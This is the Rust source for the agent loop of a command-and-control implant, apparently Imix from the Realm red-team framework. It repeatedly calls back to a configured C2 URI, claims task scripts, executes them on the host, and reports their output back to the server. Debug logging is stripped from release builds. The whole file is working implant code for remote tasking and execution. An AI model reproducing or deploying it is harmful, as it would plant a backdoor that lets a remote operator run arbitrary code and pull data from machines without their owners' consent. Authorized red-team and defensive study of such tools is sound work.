use crate::task::TaskHandle;
use anyhow::Result;
use pb::{c2::ClaimTasksRequest, config::Config};
use std::time::{Duration, Instant};
use transport::Transport;

/*
 * Agent contains all relevant logic for managing callbacks to a c2 server.
 * It is responsible for obtaining tasks, executing them, and returning their output.
 */
pub struct Agent<T: Transport> {
    cfg: Config,
    handles: Vec<TaskHandle>,
    t: T,
}

impl<T: Transport + 'static> Agent<T> {
    /*
     * Initialize an agent using the provided configuration.
     */
    pub fn new(cfg: Config, t: T) -> Result<Self> {
        Ok(Agent {
            cfg,
            handles: Vec::new(),
            t,
        })
    }

    // Claim tasks and start their execution
    async fn claim_tasks(&mut self, mut tavern: T) -> Result<()> {
        let tasks = tavern
            .claim_tasks(ClaimTasksRequest {
                beacon: self.cfg.info.clone(),
            })
            .await?
            .tasks;

        #[cfg(debug_assertions)]
        if !tasks.is_empty() {
            log::info!("{} tasks claimed", tasks.len());
        }

        for task in tasks {
            let tome = match task.tome {
                Some(t) => t,
                None => {
                    continue;
                }
            };

            let runtime = eldritch::start(task.id, tome).await;
            self.handles.push(TaskHandle::new(task.id, runtime));

            #[cfg(debug_assertions)]
            log::info!("spawned task execution for id={}", task.id);
        }
        Ok(())
    }

    // Report task output, remove completed tasks
    async fn report(&mut self, mut tavern: T) -> Result<()> {
        // Report output from each handle
        let mut idx = 0;
        while idx < self.handles.len() {
            // Report task output
            // Moving this before the if even though it double reports.
            // Seems to resolve an issue with IO blocked and fast tasks
            // running at the same time.
            // https://github.com/spellshift/realm/issues/754
            self.cfg = self.handles[idx]
                .report(&mut tavern, self.cfg.clone())
                .await?;

            // Drop any handles that have completed
            if self.handles[idx].is_finished() {
                let mut handle = self.handles.remove(idx);
                self.cfg = handle.report(&mut tavern, self.cfg.clone()).await?;
                continue;
            }

            idx += 1;
        }

        Ok(())
    }

    /*
     * Callback once using the configured client to claim new tasks and report available output.
     */
    pub async fn callback(&mut self) -> Result<()> {
        // Convert Vec<u8> to [u8; 32] for server_pubkey
        let mut server_pubkey = [0u8; 32];
        let len = std::cmp::min(self.cfg.server_pubkey.len(), 32);
        server_pubkey[..len].copy_from_slice(&self.cfg.server_pubkey[..len]);

        self.t = T::new(
            self.cfg.callback_uri.clone(),
            self.cfg.proxy_uri.clone(),
            server_pubkey,
        )?;
        self.claim_tasks(self.t.clone()).await?;
        self.report(self.t.clone()).await?;
        self.t = T::init(); // re-init to make sure no active connections during sleep

        Ok(())
    }

    /*
     * Callback indefinitely using the configured client to claim new tasks and report available output.
     */
    pub async fn callback_loop(&mut self) -> Result<()> {
        loop {
            let start = Instant::now();

            // Sometimes Imix starts too quickly in a boot sequence, a NIC is down during the initial callback,
            // or the box Imix is on changes its IP. In any case, for each callback we should refresh our claimed
            // IP.
            self.cfg.refresh_primary_ip();

            match self.callback().await {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("callback failed: {}", _err);
                }
            };

            if self.cfg.run_once {
                return Ok(());
            }

            let interval = match self.cfg.info.clone() {
                Some(b) => Ok(b.interval),
                None => Err(anyhow::anyhow!("beacon info is missing from agent")),
            }?;
            let delay = match interval.checked_sub(start.elapsed().as_secs()) {
                Some(secs) => Duration::from_secs(secs),
                None => Duration::from_secs(0),
            };

            #[cfg(debug_assertions)]
            log::info!(
                "callback complete (duration={}s, sleep={}s)",
                start.elapsed().as_secs(),
                delay.as_secs()
            );

            std::thread::sleep(delay);
        }
    }
}
